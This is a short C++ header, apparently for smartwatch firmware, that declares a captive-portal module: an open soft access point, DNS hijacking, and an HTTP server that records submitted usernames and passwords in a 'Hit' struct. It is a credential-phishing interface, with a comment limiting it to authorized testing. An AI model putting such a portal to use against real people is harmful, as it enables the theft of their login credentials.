// Captive portal: brings up softAP + DNS hijack + HTTP server that captures
// form submissions to /submit. Use for authorized testing on networks you
// own — the captured strings live in RAM only and are wiped on stop().
#pragma once
#include <stdint.h>

namespace captive {
  // Bring up softAP "smartwatch" (open) plus DNS + HTTP. Returns false if
  // softAP already up. Pair with stop() before re-entering STA mode.
  bool start(const char* ssid);
  void stop();
  void tick();              // pumps DNS + HTTP
  bool running();

  // Snapshot collected submissions. Caller copies, no ownership transfer.
  // Each call returns up to max entries; n = how many were filled.
  struct Hit {
    uint32_t ms;            // millis() at capture
    char     user[48];
    char     pass[48];
  };
  uint8_t snapshot(Hit* out, uint8_t max);
  uint8_t clientCount();    // softAPgetStationNum()
}
